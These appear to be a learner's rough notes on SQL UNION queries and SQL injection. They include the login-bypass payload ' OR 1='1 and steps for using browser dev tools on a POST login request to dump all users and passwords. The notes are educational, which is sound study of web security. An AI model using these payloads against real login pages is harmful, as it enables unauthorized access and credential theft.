	USE session (semi case sensitive)
	SELECT * FROM session; 
	
		each database contians mutiple tables 
		access using dot notation session.car session.user 
		
	select * from sessions.car;
	
		the table contians columns 
		colums contain data 
		
	half to guess how many columsns there are to union half to match.
	data types matter 
	
	
	select * from session.Tire; UNION select * from session.car;
	
	HALF to use the amount of columns in first table 
	 	
	select * from session.Tire; UNION select name,type,cost,color from 		session.car;	
	golden statement to find names of other tables columns 
		
#sql injection - considerations 
		
	requires valid sql queries 
	Fully patched systems can be vulnerable due to misconfiguration
	Input Field Sanitization
	String vs Integer Values
	Is information_schema Database available?
	GET Request versus POST Request HTTP methods
		
		
	*' OR 1 = '1* <-- first step testing for sql injection  will break give 					all users and password if works

		web explotation another tool
		username passwd sql 
		' or 1='1 user
		' or 1='1 passwd
		POST method 
		url
		network tab f12 dev console 
		reload and click on post request 
		go to request or where username and password is turn to raw or 			source copy and paste after url with before that a question mark 			enter all users and passwords
		only thing you can do for a login page get user pass using sql
		if not useless.
